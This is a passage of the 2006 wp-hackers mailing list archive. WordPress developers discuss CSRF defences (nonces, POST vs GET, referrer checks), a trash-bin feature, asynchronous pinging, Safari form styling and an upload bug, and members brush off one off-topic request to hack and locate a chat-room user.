>> but every sensible option should be considered. I think that's also a
>> part of the WP development? I think it should be, anyway.
>
> http://comox.textdrive.com/pipermail/wp-hackers/2006-February/004816.html
>
> Did that before :)
>
> P.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
Just thought I'd fork this discussion to a different thread.  OMG, did I 
say fork?

Anyway, an idea for implementing a trash-bin in WP might be the simple 
addition of post_status = deleted or comment_approved = deleted ?  We've 
already separated posts, pages, attachments into post_type, so the 
distinction wouldn't be hard to make code-wise...

Just a thought.

Ryan
From mikea at turbonet.com  Mon Apr 24 20:47:50 2006
From: mikea at turbonet.com (Michael D Adams)
Date: Mon Apr 24 20:50:45 2006
Subject: [wp-hackers] AJAX / JS libraries
In-Reply-To: <e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>
References: <444B8205.8070200@concept64.com>
	<e6ec604d0604231355v2d8034a2k69aa1adbfa8c1a5e@mail.gmail.com>
Message-ID: <497E965F-F272-430D-ABB3-798EED1B9BB2@turbonet.com>

On Apr 23, 2006, at 1:55 PM, Andy Skelton wrote:
> We ought to have a set of core PHP functions to handle javascript
> includes. Sort of like a wrapper for
> add_action(is_admin()?'admin_head':'wp_head', $callback) where
> $callback cannot be registered twice and known dependencies can be
> handled (e.g. if Scriptaculous, include Prototype).
To jump on the bandwagon: +1.  That is a very nice idea.

> Another possibility is to write a gzip compressor that concatenates
> all of the requested js libraries and compresses them. This would
> reduce bandwidth in most cases.
> script src="wp-includes/js/wp_js.php?prototype+scriptaculous"
To continue to do so (for the same reasons others have better put): -1

Michael
From dmhouse at gmail.com  Mon Apr 24 20:50:52 2006
From: dmhouse at gmail.com (David House)
Date: Mon Apr 24 20:55:03 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <7235ce780604241330u87c79cfs98cf45d86848777f@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<444CE689.6050202@midnightcircus.com> <444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
	<444CEC48.9060309@concept64.com>
	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com> <444CF6A6.9010002@midnightcircus.com>
	<ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
	<7235ce780604241330u87c79cfs98cf45d86848777f@mail.gmail.com>
Message-ID: <ebe43d680604241350q64b95b3bx3feef01646cd8e00@mail.gmail.com>

On 24/04/06, Mike Little <mike@zed1.com> wrote:
> Allegedly, POST plus referrer check can still be circumvented, though
> I do not understand how. Yes, you can fool an admin into clicking on a
> link which will take him to a page with an evil form, but even if you
> get *that* page to auto submit, the form's referrer would be itself,
> not an admin page.

No, that's not what I claimed. I said that if we switched to POST
actions, we'd still need nonces OR a referer check, and as referer
checks are easily missed and an annoyance to those firewalled, nonces
are the way forward.

Just to clarify.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From mollyxyz123 at yahoo.com  Mon Apr 24 20:36:01 2006
From: mollyxyz123 at yahoo.com (Molly)
Date: Mon Apr 24 21:05:36 2006
Subject: [wp-hackers] Challenge
Message-ID: <4071578.post@talk.nabble.com>


There is a chat site I love to visit and almost every day someone floods the
room with n0onsense and no one can use the room. This goes on and on. Can
anyone hack the person and warn them or get their address so we can send
them some mail? I think this is too much for someone to do. They think no
one can identify them. Can someone set them straight? The site is
chat.bianca.com/chat/
Go there and usuall the person will be flooding the site at least once a
day. Normally on week days, not on week ends so must be a work computer.??
/thanks Molly
--
View this message in context: http://www.nabble.com/Challenge-t1501834.html#a4071578
Sent from the Wordpress Hackers forum at Nabble.com.

From ryan at concept64.com  Mon Apr 24 21:02:27 2006
From: ryan at concept64.com (Ryan Scheuermann)
Date: Mon Apr 24 21:06:43 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <7235ce780604241330u87c79cfs98cf45d86848777f@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>	<444CE689.6050202@midnightcircus.com>
	<444CEA40.30708@concept64.com>	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>	<444CEC48.9060309@concept64.com>	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>	<444CF263.8000006@concept64.com>
	<444CF6A6.9010002@midnightcircus.com>	<ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
	<7235ce780604241330u87c79cfs98cf45d86848777f@mail.gmail.com>
Message-ID: <444D3CE3.4060901@concept64.com>

Mike Little wrote:
> On 4/24/06, David House <dmhouse@gmail.com> wrote:
>   
>> On 24/04/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>>     
>>> Using POST does not obviate nonces or referer checks.
>>>       
>> Lets just re-iterate that, folks.
>>
>>     
>>> Using POST does not obviate nonces or referer checks.
>>>       
>> One more time with feeling.
>>
>>     
>>> Using POST does not obviate nonces or referer checks.
>>>       
>> A little aside for anyone who doesn't understand the attack vector:
>>     
>
> The example exploit, that works NOW, *with* referrer check,
> demonstrated by Brian, *would not* work if delete was a POST.  That is
> why some people got so heated about POST vs GET. It is demonstrably
> safer, right now.
> Not completely safe*, true, but safe from the existing exploit!
>
> Allegedly, POST plus referrer check can still be circumvented, though
> I do not understand how. Yes, you can fool an admin into clicking on a
> link which will take him to a page with an evil form, but even if you
> get *that* page to auto submit, the form's referrer would be itself,
> not an admin page.
>
> Unlike the GET attack which can be in your admin comments page, there
> is no way to get an evil form in an Admin page, apart from authorised
> users who can do any number of evil things.
>
>
> Mike
> --
> Mike Little
> http://zed1.com/
>   

You're right Mike, but that doesn't solve the problem of people that 
don't have check_referrer capabilities (due to firewalls, etc).  They 
are still at risk to forms being POSTed from other sites.  So the nonces 
are the only solution that handles all cases.

I'm also publicly and on the record agreeing with Owen - using POST or 
GET makes no difference in terms of authentication or security.  Yes, it 
makes sense to do deletes with a POST, but it's purely an academic 
choice.  Security and authentication MUST be implemented in other ways, 
and the most universally accepted way right now for this problem is nonces.

Ryan
From angsuman at taragana.com  Mon Apr 24 21:01:53 2006
From: angsuman at taragana.com (Angsuman Chakraborty)
Date: Mon Apr 24 21:07:16 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <01b601c667db$7227af60$6e01a8c0@sixfour>
Message-ID: <MJEEIIFCKOJBBNFPJGJCKEPALDAA.angsuman@taragana.com>

> using a socket effectively spawns it off on another thread, another context, 

Has this assumption been verified for php?

This isn't true for languages like C / Java. I haven't tested it for php but it seems that would be rather strange behavior.

-----Original Message-----
From: wp-hackers-bounces@lists.automattic.com
[mailto:wp-hackers-bounces@lists.automattic.com]On Behalf Of David Chait
Sent: Tuesday, April 25, 2006 1:43 AM
To: wp-hackers@lists.automattic.com
Subject: Re: [wp-hackers] Questions on execute-pings.php...
Importance: Low


Someone correct me if I'm wrong... the 'include' would work within the 
current thread, thus affecting the user response if something takes a while. 
using a socket effectively spawns it off on another thread, another context, 
without affecting the current session.

At least, that's what I seem to recall... ;)

-d

----- Original Message ----- 
From: "Angsuman Chakraborty" <angsuman@taragana.com>
To: <wp-hackers@lists.automattic.com>
Sent: Monday, April 24, 2006 2:36 PM
Subject: [wp-hackers] Questions on execute-pings.php...


Hi,

I don't understand why the query in the while loop which check for _pingme 
rows doesn't check if the post is really ready to be pingbacked or 
trackbacked (at least post_date < current time).

Also I am trying to understand the real reason behind calling this code via 
a socket connection (instead of including it). is it merely in the hope that 
due to the small timeout sometimes it will fail thereby achieving the 
asynchronicity on pinback and trackback?

Can anyone please clarify.

Best,
Angsuman
http://blog.taragana.com/

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From dmhouse at gmail.com  Mon Apr 24 21:10:28 2006
From: dmhouse at gmail.com (David House)
Date: Mon Apr 24 21:14:40 2006
Subject: [wp-hackers] Challenge
In-Reply-To: <4071578.post@talk.nabble.com>
References: <4071578.post@talk.nabble.com>
Message-ID: <ebe43d680604241410h533634cckdad1c937ac01cbb0@mail.gmail.com>

On 24/04/06, Molly <mollyxyz123@yahoo.com> wrote:
> There is a chat site I love to visit and almost every day someone floods the
> room with n0onsense and no one can use the room. This goes on and on. Can
> anyone hack the person and warn them or get their address so we can send
> them some mail? I think this is too much for someone to do. They think no
> one can identify them. Can someone set them straight? The site is
> chat.bianca.com/chat/
> Go there and usuall the person will be flooding the site at least once a
> day. Normally on week days, not on week ends so must be a work computer.??
> /thanks Molly

http://comox.textdrive.com/pipermail/wp-hackers/2006-January/004250.html

Another victim of the "But I just googled for 'hacker'!" syndrome.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From mikea at turbonet.com  Mon Apr 24 21:15:34 2006
From: mikea at turbonet.com (Michael D Adams)
Date: Mon Apr 24 21:18:54 2006
Subject: [Spam] [wp-hackers] Challenge
In-Reply-To: <4071578.post@talk.nabble.com>
References: <4071578.post@talk.nabble.com>
Message-ID: <E837A817-E2A9-4908-9641-4AC085B948DF@turbonet.com>

On Apr 24, 2006, at 1:36 PM, Molly wrote:
> There is a chat site I love to visit and almost every day someone  
> floods the
> room with n0onsense and no one can use the room. This goes on and  
> on. Can
> anyone hack the person and warn them or get their address so we can  
> send
> them some mail? I think this is too much for someone to do. They  
> think no
> one can identify them. Can someone set them straight? The site is
> chat.bianca.com/chat/
> Go there and usuall the person will be flooding the site at least  
> once a
> day. Normally on week days, not on week ends so must be a work  
> computer.??
> /thanks Molly

Are you inquiring about a challenge!?

http://www.homestarrunner.com/stinkogame/v7/stinkogame.html
From davebytes at comcast.net  Mon Apr 24 21:23:54 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Apr 24 21:27:20 2006
Subject: [wp-hackers] Security at Wordpress
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98097@dsimail.drbsystems.com>
Message-ID: <01fb01c667e5$63e5bcd0$6e01a8c0@sixfour>

Brian Layman wrote:
|
| David Chait
| >Is it allowed to require a AYS (i.e. POST-ed form) to validate the
| >approval?
| You're mixing apples and oranges.   AYS does not mean "post" and posts
| doesn't fix everything.

Ummm... First, I was specifically asking whether an "AYS" POSTed form would 
be 'allowable', not confusing apples and oranges.  Second, I didn't ever say 
POST "fixed everything".  It doesn't.  But, it does a bunch of things 
'better' potentially.  Again, I'm not on one side or the other -- and in 
fact trying to clarify Owen's opinion, given he basically has said he's open 
to POST if it doesn't 'violate' a few things dear to him. ;)

| The discussion at this point is largely academic.

It is certainly not.  So far as I can tell the discussion is still ongoing, 
and still getting some 'important people' to weigh in, despite a few 
naysayers basically claiming the discussion is over.

|Switching over to posting would mean rewriting a lot more code and require 
a
|lot more testing and would delay any release.
|That's good enough reason not to do it right now, IMHO.

If someone else is willing to put forth code, and testers are willing to 
test, IMHO that's good enough reason to do it (AGAIN, if agreed it makes a 
difference!).  Whether 'right now' or not is a different question -- but I 
don't know a thing about release schedules, features being worked on, and 
whether this would in fact truly 'delay' things.

Further IMHO, if enough 'important people' chime in and agree, then delaying 
a release in order to further enhance security or otherwise improve the core 
would seem both fine and prudent. ;)

Whether or not POSTing is needed, whether or not Nonces and prompts have 
secured things 'good enough for now', I'll let 'important people' vote on --  
when it comes to security, I don't feel I have enough knowledge to vote. ;)

-d 

From davebytes at comcast.net  Mon Apr 24 21:28:58 2006
From: davebytes at comcast.net (David Chait)
Date: Mon Apr 24 21:32:26 2006
Subject: [wp-hackers] Questions on execute-pings.php...
References: <MJEEIIFCKOJBBNFPJGJCKEPALDAA.angsuman@taragana.com>
Message-ID: <020501c667e6$1953f730$6e01a8c0@sixfour>

Why isn't it true for C/Java?  You open up a socket to a webserver.  That 
spawns a 'thread' of execution of some sort to handle the connection. 
Something executes in the context of that 'thread'.  It does not happen in 
the context of the caller.  Now, whether/how the socket needs to stay open 
for that thread to not be stopped prematurely is another topic entirely. ;) 
But this should be caller-language independent -- only dependence is on the 
socket handling and execution handling on the server end.

I would assume/presume the person who added that code had done testing --  
and maybe had copied the approach from another project, not just making it 
up. ;)

-d

----- Original Message ----- 
From: "Angsuman Chakraborty" <angsuman@taragana.com>
To: <wp-hackers@lists.automattic.com>
Sent: Monday, April 24, 2006 5:01 PM
Subject: RE: [wp-hackers] Questions on execute-pings.php...


> using a socket effectively spawns it off on another thread, another 
> context,

Has this assumption been verified for php?

This isn't true for languages like C / Java. I haven't tested it for php but 
it seems that would be rather strange behavior.

-----Original Message-----
From: wp-hackers-bounces@lists.automattic.com
[mailto:wp-hackers-bounces@lists.automattic.com]On Behalf Of David Chait
Sent: Tuesday, April 25, 2006 1:43 AM
To: wp-hackers@lists.automattic.com
Subject: Re: [wp-hackers] Questions on execute-pings.php...
Importance: Low


Someone correct me if I'm wrong... the 'include' would work within the
current thread, thus affecting the user response if something takes a while.
using a socket effectively spawns it off on another thread, another context,
without affecting the current session.

At least, that's what I seem to recall... ;)

-d

----- Original Message ----- 
From: "Angsuman Chakraborty" <angsuman@taragana.com>
To: <wp-hackers@lists.automattic.com>
Sent: Monday, April 24, 2006 2:36 PM
Subject: [wp-hackers] Questions on execute-pings.php...


Hi,

I don't understand why the query in the while loop which check for _pingme
rows doesn't check if the post is really ready to be pingbacked or
trackbacked (at least post_date < current time).

Also I am trying to understand the real reason behind calling this code via
a socket connection (instead of including it). is it merely in the hope that
due to the small timeout sometimes it will fail thereby achieving the
asynchronicity on pinback and trackback?

Can anyone please clarify.

Best,
Angsuman
http://blog.taragana.com/

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From Brian at TheCodeCave.com  Mon Apr 24 22:03:41 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 24 22:07:57 2006
Subject: [wp-hackers] RE: A quick update on the security issue
	I'dmentioned today
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98098@dsimail.drbsystems.com>

Matt Mullenweg wrote:
> If the attacker is able to upload and execute a file on the server, it's 
> already far beyond where we could do anything on the WordPress level to 
> protect that site. What you describe is a pretty clever hack once things 
> are already on the server, though. Thanks for continuing to investigate 
> this.

Thanks for being cool about it, Matt.  

And I agree with your statement too: getting this stuff on the server is
next to impossible in most situations and is specifically what WordPress has
taken steps to combat.

I'm glad I did this though, because I'd thought I'd secured my semi-public
upload directory fairly well. However, I instead just proved that you can
only protect yourself from what you know about.

As the saying goes:

"If you know the enemy and know yourself, 
     you need not fear the result of a hundred battles.  
If you know yourself but not the enemy, 
     for every victory gained you will also suffer a defeat. 
If you know neither the enemy nor yourself, 
     you will succumb in every battle."
Sun Tzu's Art of War. Chapter 3 verse 18
http://www.chinapage.com/sunzi-e.html


_______________________________________________
Brian Layman
www.TheCodeCave.com
 



From skeltoac at gmail.com  Mon Apr 24 23:32:20 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Apr 24 23:36:29 2006
Subject: [wp-hackers] Reposting my lost chronicle: Revisiting the 'Trash
	Can' idea...
In-Reply-To: <015901c667c3$2fc9dd40$6e01a8c0@sixfour>
References: <015901c667c3$2fc9dd40$6e01a8c0@sixfour>
Message-ID: <e6ec604d0604241632y5ed8ac13o4f869468bc67406@mail.gmail.com>

On 4/24/06, David Chait <davebytes@comcast.net> wrote:
> The discussion revolved, I believe, around two points:
> 1. Do we really need 'undo' around deletions?  Or, at that point, around
> other actions.
> 2. If it seems useful, how do we implement it quickly, so it 'drops' right
> into the existing architecture with minimal impact.

Figure out what hooks are needed to make this happen with a plugin. I
would suggest your plugin create a table with two cols to hold
table_name and serialized_row.

Andy
From skeltoac at gmail.com  Mon Apr 24 23:58:54 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Tue Apr 25 00:03:04 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <020501c667e6$1953f730$6e01a8c0@sixfour>
References: <MJEEIIFCKOJBBNFPJGJCKEPALDAA.angsuman@taragana.com>
	<020501c667e6$1953f730$6e01a8c0@sixfour>
Message-ID: <e6ec604d0604241658w52de3743t1fc549f90c4c3712@mail.gmail.com>

On 4/24/06, David Chait <davebytes@comcast.net> wrote:
> I would assume/presume the person who added that code had done testing --
> and maybe had copied the approach from another project, not just making it
> up. ;)

No, I made it up.

Actually somebody had the bright idea of an iframe so that the browser
would be the middleman. This worked much of the time but failed when
the browser's next page wasn't an admin page, as can happen when
publishing from other tools than the usual Write Post screen, or
posting via XMLRPC.

My solution to that was to spawn the new thread via HTTP request from
the server itself. (Thus was born Argyle.) Now a post from an XMLRPC
client would spawn the pinger without relying on the user to visit the
dashboard, triggering the pinger via iframe. This worked on almost all
server configs. Certain CGI setups didn't work this way due to a PHP
bug so we forked the code for them: if CGI, use iframe instead of
HTTP.

This was all done in the interest of reducing the apparent delay when
posting, which was caused by waiting for so many remote servers to
respond to the pings.

Now some other folks have had their fingers in the code and I don't
know what it's doing. I hope the history lesson has some value anyway.
:-)

Andy
From r at schestowitz.com  Tue Apr 25 00:16:04 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Tue Apr 25 00:12:40 2006
Subject: [wp-hackers] Reposting my lost chronicle: Revisiting the
	'Trash Can' idea...
In-Reply-To: <015901c667c3$2fc9dd40$6e01a8c0@sixfour>
References: <015901c667c3$2fc9dd40$6e01a8c0@sixfour>
Message-ID: <20060425011604.ev85o7ldyinwc4cw@banana.catalyst2.com>

___/ On Mon 24 Apr 2006 18:19:04 BST, [ David Chait ] wrote : \___

> Off the whole 'someone can get me to delete something' thread, I had posted
> a new thread -- unfortunately from the wrong email account, and apparently
> got no bounce message.  So, here's my email, again...
>
> ----------
>
> A while back there was discussion of having deletions go to a conceptual
> 'trash' state, which could later be emptied (automatically over some time
> period, or manually, OR restored).  This came back to me as I said to myself
> "Gee, Nonces seem great.  But if there's another vector that somehow gets me
> to try and delete my own stuff, is there a way I can recover quickly?"
> Which brought me back to the trashcan.
>
> The discussion revolved, I believe, around two points:
> 1. Do we really need 'undo' around deletions?  Or, at that point, around
> other actions.
> 2. If it seems useful, how do we implement it quickly, so it 'drops' right
> into the existing architecture with minimal impact.
>
> <snip />

My initial instinct was to say that it would lead to confusion, much like
deletion in IMAP mail folders. After a second thought, I realised it would
be an essential feature to some, so should probably be implemented as a
plug-in. Think of it as thought it was tab snapback in Mozilla Firefox.
There is one additional concern which is privacy, which is the cost of
having an extra layer to deletion. Trash can annoy the user sometimes
because they facilitate a two-tiered deletion, despite a confirmation
prompt, which makes it three-tiered..

Roy

From leftjustified at gmail.com  Tue Apr 25 00:14:01 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Tue Apr 25 00:18:11 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444D1F27.4030607@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<444CE689.6050202@midnightcircus.com> <444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
	<444CEC48.9060309@concept64.com>
	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com> <444CF6A6.9010002@midnightcircus.com>
	<ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
	<444D1F27.4030607@midnightcircus.com>
Message-ID: <6453a6e90604241714r6ab2437oc2861ac85f8adb2c@mail.gmail.com>

On 4/25/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> The sample page Andrew provided is not bad, but there are still some
> issues with consistency in Safari.

Some would argue (such as Rob hinted at earlier in this thread) that
the interface is /more/ consistant because of the use of default form
controls in Safari. After all, they match every other button on ever
page Saf. users visit and are part of the operating system's
consistancy .

Apple wants their users to always know a button is a button, and that
a button is something that has implications/results [data is being
submitted]. I'd go so far as to say the reasons for Safari not
supporting <input type='submit' /> styling[1] adds weight to the
usability/UI reason for forms over links.

-Andrew

[1] I posted earlier that Safari has optional support for form element
styling. This is not quite the case; they plan to support styling of 
text fields: http://webkit.opendarwin.org/blog/?p=51
From jw+wp at jameswestby.net  Tue Apr 25 01:24:55 2006
From: jw+wp at jameswestby.net (James Westby)
Date: Tue Apr 25 01:29:08 2006
Subject: [wp-hackers] inline-uploading.php
Message-ID: <20060425012454.GA15555@jameswestby.net>

I'm running latest SVN on apache2 with php4. I have just tried to upload
an image for the first time to attach to a post, but firefox prompts me
to download inline-uploading.php. I couldn't see anything on trac about
this. 

It strikes me that it could well be a configuration issue at my end, but
I can't see anything special about this script.

Can anyone confirm this? If not could you suggest where I should look
for possible fixes?

Oh, and I'm using SSL and modsecurity (though I tested with this off and
saw the same effect). The request headers look OK to my untrained eye.

James


From lists at alexking.org  Tue Apr 25 01:36:27 2006
From: lists at alexking.org (Alex King)
Date: Tue Apr 25 01:40:42 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <6453a6e90604241714r6ab2437oc2861ac85f8adb2c@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<444CE689.6050202@midnightcircus.com>
	<444CEA40.30708@concept64.com>
	<e8e97f9f0604240814h1d938de6r2091eedca11c3504@mail.gmail.com>
	<444CEC48.9060309@concept64.com>
	<e8e97f9f0604240826n6f0191c0l3807f1e4171e7eaa@mail.gmail.com>
	<444CF263.8000006@concept64.com>
	<444CF6A6.9010002@midnightcircus.com>
	<ebe43d680604241034q77a127f0qb7bbff6bef7b0921@mail.gmail.com>
	<444D1F27.4030607@midnightcircus.com>
	<6453a6e90604241714r6ab2437oc2861ac85f8adb2c@mail.gmail.com>
Message-ID: <4205A0BB-F916-481A-83C5-A957C8684AEE@alexking.org>

Safari only supports several sizes of text in their buttons as well  
(translating the actual CSS rules to their "nearest fit") - this is a  
"feature".

http://www.alexking.org/blog/2004/02/02/safari-12/

Cheers,
--Alex

Personal   http://alexking.org
Business   http://kingdesign.net
FeedLounge http://feedlounge.com

On Apr 24, 2006, at 6:14 PM, Andrew Krespanis wrote:

> [1] I posted earlier that Safari has optional support for form element
> styling. This is not quite the case; they plan to support styling of
> text fields: http://webkit.opendarwin.org/blog/?p=51
From jw+wp at jameswestby.net  Tue Apr 25 01:36:42 2006
From: jw+wp at jameswestby.net (James Westby)
Date: Tue Apr 25 01:40:52 2006
Subject: [wp-hackers] inline-uploading.php
In-Reply-To: <20060425012454.GA15555@jameswestby.net>
References: <20060425012454.GA15555@jameswestby.net>
Message-ID: <20060425013642.GB15555@jameswestby.net>

On (25/04/06 02:24), James Westby wrote:
> I'm running latest SVN on apache2 with php4. I have just tried to upload
> an image for the first time to attach to a post, but firefox prompts me
> to download inline-uploading.php. I couldn't see anything on trac about
> this. 
> 
> It strikes me that it could well be a configuration issue at my end, but
> I can't see anything special about this script.
> 
> Can anyone confirm this? If not could you suggest where I should look
> for possible fixes?
> 
> Oh, and I'm using SSL and modsecurity (though I tested with this off and
> saw the same effect). The request headers look OK to my untrained eye.
>

Looking again the images were uploaded, but it didn't appear that way. 

Could it be related the the content header being set at the top op
inline-uploading.php?

James


From false.hopes at gmail.com  Tue Apr 25 01:59:13 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Tue Apr 25 02:03:25 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <e6ec604d0604241658w52de3743t1fc549f90c4c3712@mail.gmail.com>
References: <MJEEIIFCKOJBBNFPJGJCKEPALDAA.angsuman@taragana.com>
	<020501c667e6$1953f730$6e01a8c0@sixfour>
	<e6ec604d0604241658w52de3743t1fc549f90c4c3712@mail.gmail.com>
Message-ID: <a491f91d0604241859u1b04d843wb4669601f203679e@mail.gmail.com>

On 4/24/06, Andy Skelton <skeltoac@gmail.com> wrote:
> Now some other folks have had their fingers in the code and I don't
> know what it's doing. I hope the history lesson has some value anyway.
> :-)

/me takes his fingers out of the cake.

At any rate, its now doing the same theory of spawning off a request,
but to a unified cron schedule, which schedules pings to be run at the
exact time of the post (present or future), and they will be run at
the next hit after the time has passed (or at the time). This helps us
remove one extra file and some duplicated code.

--
--Robert Deaton
http://somethingunpredictable.com
From skeltoac at gmail.com  Tue Apr 25 02:34:55 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Tue Apr 25 02:39:05 2006
Subject: [wp-hackers] inline-uploading.php
In-Reply-To: <20060425013642.GB15555@jameswestby.net>
References: <20060425012454.GA15555@jameswestby.net>
	<20060425013642.GB15555@jameswestby.net>
Message-ID: <e6ec604d0604241934o676fc94buebfac4e05a9be019@mail.gmail.com>

On 4/24/06, James Westby <jw+wp@jameswestby.net> wrote:
>
> Looking again the images were uploaded, but it didn't appear that way.
>
> Could it be related the the content header being set at the top op
> inline-uploading.php?

Content-Disposition is the kind of header that would tell your browser
to save the response body. I'd say you probably have a misconfig
somewhere because this is not a common problem. Tell the list if you
find a definite cause.

Cheers,
Andy
From angsuman at taragana.com  Tue Apr 25 04:48:34 2006
From: angsuman at taragana.com (Angsuman Chakraborty)
Date: Tue Apr 25 04:53:39 2006
Subject: [wp-hackers] Questions on execute-pings.php...
In-Reply-To: <020501c667e6$1953f730$6e01a8c0@sixfour>
Message-ID: <MJEEIIFCKOJBBNFPJGJCKEPHLDAA.angsuman@taragana.com>

> Why isn't it true for C/Java?  You open up a socket to a webserver.  That 
spawns a 'thread' of execution of some sort to handle the connection. 

It doesn't (on the client side or the side making the request) unless you explicitly spawn one to connect to the server. In this case the code is synchronously opening the socket and pasing some data.

Note: It does spawn (or resuse) a thread (or process) on the server side but that doesn't help the client making the request as it is waiting for the request processing to complete. The only way I can see to make this viable is to send UDP packets or explicitly spawn a thread. Can you create threads in php? I think not. The nearest I could find was ticks. But then even that most likely doesn't work when the request handling thread / process completes execution.

Thoughts?

> not just making it up. ;)

I too hope so :) though I simply cannot fathom the logic. I wish the author of this code would shed some light too.

-----Original Message-----
From: wp-hackers-bounces@lists.automattic.com
[mailto:wp-hackers-bounces@lists.automattic.com]On Behalf Of David Chait
Sent: Tuesday, April 25, 2006 2:59 AM
To: wp-hackers@lists.automattic.com
Subject: Re: [wp-hackers] Questions on execute-pings.php...
Importance: Low


Why isn't it true for C/Java?  You open up a socket to a webserver.  That 
spawns a 'thread' of execution of some sort to handle the connection. 
Something executes in the context of that 'thread'.  It does not happen in 
the context of the caller.  Now, whether/how the socket needs to stay open 
for that thread to not be stopped prematurely is another topic entirely. ;) 
But this should be caller-language independent -- only dependence is on the 
socket handling and execution handling on the server end.

I would assume/presume the person who added that code had done testing --  
and maybe had copied the approach from another project, not just making it 
up. ;)

-d

----- Original Message ----- 
From: "Angsuman Chakraborty" <angsuman@taragana.com>
To: <wp-hackers@lists.automattic.com>
Sent: Monday, April 24, 2006 5:01 PM
Subject: RE: [wp-hackers] Questions on execute-pings.php...


> using a socket effectively spawns it off on another thread, another 
> context,

Has this assumption been verified for php?

This isn't true for languages like C / Java. I haven't tested it for php but 
it seems that would be rather strange behavior.

-----Original Message-----
From: wp-hackers-bounces@lists.automattic.com
[mailto:wp-hackers-bounces@lists.automattic.com]On Behalf Of David Chait
Sent: Tuesday, April 25, 2006 1:43 AM
To: wp-hackers@lists.automattic.com
Subject: Re: [wp-hackers] Questions on execute-pings.php...
Importance: Low


Someone correct me if I'm wrong... the 'include' would work within the
current thread, thus affecting the user response if something takes a while.
using a socket effectively spawns it off on another thread, another context,
without affecting the current session.

At least, that's what I seem to recall... ;)

-d

----- Original Message ----- 
From: "Angsuman Chakraborty" <angsuman@taragana.com>
To: <wp-hackers@lists.automattic.com>
Sent: Monday, April 24, 2006 2:36 PM
Subject: [wp-hackers] Questions on execute-pings.php...


Hi,

I don't understand why the query in the while loop which check for _pingme
rows doesn't check if the post is really ready to be pingbacked or
trackbacked (at least post_date < current time).

Also I am trying to understand the real reason behind calling this code via
a socket connection (instead of including it). is it merely in the hope that
due to the small timeout sometimes it will fail thereby achieving the
asynchronicity on pinback and trackback?

Can anyone please clarify.

Best,
Angsuman
http://blog.taragana.com/

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

_______________________________________________
wp-hackers mailing list
wp-hackers@lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From angsuman at taragana.com  Tue Apr 25 04:51:35 2006
From: angsuman at taragana.com (Angsuman Chakraborty)
Date: Tue Apr 25 04:56:07 2006
Subject: [wp-hackers] RE: A quick update on the
	securityissueI'dmentionedtoday
In-Reply-To: <000301c667d3$55fc5b40$2f01a8c0@kergan>
Message-ID: <MJEEIIFCKOJBBNFPJGJCOEPHLDAA.angsuman@taragana.com>

A detailed how-to might actually make coders more cautious before posting a code for public consumption next time around and users (of the code) before consuming any code in the wild.

Security by obscurity is just hiding the symptom, not tackling the cause.

-----Original Message-----
From: wp-hackers-bounces@lists.automattic.com
[mailto:wp-hackers-bounces@lists.automattic.com]On Behalf Of Denis de
Bernardy
